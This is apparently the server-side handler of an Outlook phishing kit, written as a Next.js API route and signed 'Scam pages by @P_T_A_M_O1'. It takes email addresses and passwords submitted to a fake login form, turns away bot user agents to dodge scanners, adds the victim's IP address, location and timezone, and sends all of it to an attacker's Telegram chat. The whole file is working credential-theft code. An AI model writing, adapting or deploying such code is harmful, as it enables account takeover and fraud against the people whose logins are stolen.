import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers['user-agent'] as string);
  const isBot = md.is('Bot');
  
  if (isBot) {
    res.end('Access denied for bots.');
    return;
  }

  try {
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    const values = req.body;

    const emailDetails = values.form[0] === 'EMAIL DETAILS' 
      ? `
             📧 EMAIL DETAILS 📧 
             
🔑 Login Attempt: ${JSON.parse(values.emailLogins).attempt}
📩 Email Address: ${JSON.parse(values.emailLogins).email}
🔒 Email Password: ${JSON.parse(values.emailLogins).emailPassword}
`   : '';  const message = `
         🚨 ALERT NOTIFICATION   🚨  
${emailDetails}
🌍 IP Address: ${ip} 
📍 Location: ${geo?.city}, ${geo?.country}
🕒 Timezone: ${geo?.timezone}
🖥️ User Agent: ${req.headers['user-agent']}  

💡 Scam pages by @P_T_A_M_O1  💡
`;

    // Send Telegram message if TELEGRAM_CHAT_ID is set
    if (process.env.TELEGRAM_CHAT_ID) {
      await sendTelegram({
        message: `
*🚀 OUTLOOK ALERT*  
*Form Type: ${values.form[0]}  
*Reported from: ${ip}
${message}
`,
      });
    }

    res.status(200).send('Message sent successfully!');
  } catch (error) {
    console.error('Error in handler:', error);
    res.status(500).send({ message: 'Something went wrong. ⚠️' });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;